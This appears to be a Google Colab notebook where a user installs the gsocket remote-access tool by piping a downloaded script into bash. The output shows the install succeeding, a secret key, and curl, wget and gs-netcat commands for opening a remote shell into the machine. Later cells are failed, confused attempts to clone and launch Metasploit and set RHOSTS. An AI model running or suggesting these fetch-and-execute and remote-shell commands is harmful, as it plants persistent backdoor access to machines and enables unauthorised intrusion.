{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO7IaEnPgrDTEw6/eK3lUeF",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/akrom12312/Fighting/blob/main/Untitled0.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "IWS1Yu3aG0RY",
        "outputId": "9087ed69-e1fe-4d32-ae3b-a5f4a2f7d4ab"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--> \u001b[1;33mWARNING: \u001b[0mUsing existing secret from '/usr/bin/defunct.dat'\n",
            "--> Trying \u001b[1;32mx86_64-alpine\u001b[0m\n",
            "Downloading binaries........................................................[\u001b[1;32mOK\u001b[0m]\n",
            "Unpacking binaries..........................................................[\u001b[1;32mOK\u001b[0m]\n",
            "Copying binaries............................................................[\u001b[1;32mOK\u001b[0m]\n",
            "Testing binaries............................................................[\u001b[1;32mOK\u001b[0m]\n",
            "Testing Global Socket Relay Network.....................................[\u001b[1;31mFAILED\u001b[0m]\n",
            "--> Secret '4fpQEEvLcUG72xoMrrnH5y' is already used.\n",
            "--> To uninstall use \u001b[1;35mGS_UNDO=1 bash -c \"$(curl -fsSL https://gsocket.io/y)\"\u001b[0m\n",
            "--> To connect use one of the following:\n",
            "--> \u001b[1;35mgs-netcat -s \"4fpQEEvLcUG72xoMrrnH5y\" -i\u001b[0m\n",
            "--> \u001b[1;35mS=\"4fpQEEvLcUG72xoMrrnH5y\" bash -c \"$(curl -fsSL https://gsocket.io/y)\"\u001b[0m\n",
            "--> \u001b[1;35mS=\"4fpQEEvLcUG72xoMrrnH5y\" bash -c \"$(wget -qO- https://gsocket.io/y)\"\u001b[0m\n"
          ]
        }
      ],
      "source": [
        "!bash -c \"$(curl -fsSL https://gsocket.io/x)\""
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!bash -c \"$(git clone https://github.com/rapid7/metasploit-framework)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "SL-eMdx9KDsm",
        "outputId": "c2eb65ef-83ab-4c94-c3fa-5d7742a57850"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/bin/bash: -c: line 1: unexpected EOF while looking for matching `\"'\n",
            "/bin/bash: -c: line 2: syntax error: unexpected end of file\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "RHOSTS"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 141
        },
        "id": "HDY8O0SbHHJE",
        "outputId": "48086e23-c529-46f6-f577-8ff4c8b1992a"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "error",
          "ename": "NameError",
          "evalue": "name 'RHOSTS' is not defined",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mNameError\u001b[0m                                 Traceback (most recent call last)",
            "\u001b[0;32m/tmp/ipython-input-3-774878957.py\u001b[0m in \u001b[0;36m<cell line: 0>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mRHOSTS\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;31mNameError\u001b[0m: name 'RHOSTS' is not defined"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "pip install RHOSTS"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "eJjtsDYKHT83",
        "outputId": "1d26c81b-332c-45a3-a872-235de5e6aa84"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[31mERROR: Could not find a version that satisfies the requirement RHOSTS (from versions: none)\u001b[0m\u001b[31m\n",
            "\u001b[0m\u001b[31mERROR: No matching distribution found for RHOSTS\u001b[0m\u001b[31m\n",
            "\u001b[0m"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "sudo msfconsole\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 106
        },
        "id": "UI-vfJW5Hrs7",
        "outputId": "0edb1229-d9e9-4dc1-8a69-5f0972e9d23d"
      },
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (ipython-input-5-818006755.py, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"/tmp/ipython-input-5-818006755.py\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    sudo msfconsole\u001b[0m\n\u001b[0m         ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "git clone https://github.com/rapid7/metasploit-framework"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 106
        },
        "id": "vu0UymVoJ5Xt",
        "outputId": "1452c81e-303f-4763-c620-70203dbdc229"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "error",
          "ename": "SyntaxError",
          "evalue": "invalid syntax (ipython-input-6-3279793436.py, line 1)",
          "traceback": [
            "\u001b[0;36m  File \u001b[0;32m\"/tmp/ipython-input-6-3279793436.py\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    git clone https://github.com/rapid7/metasploit-framework\u001b[0m\n\u001b[0m        ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
          ]
        }
      ]
    }
  ]
}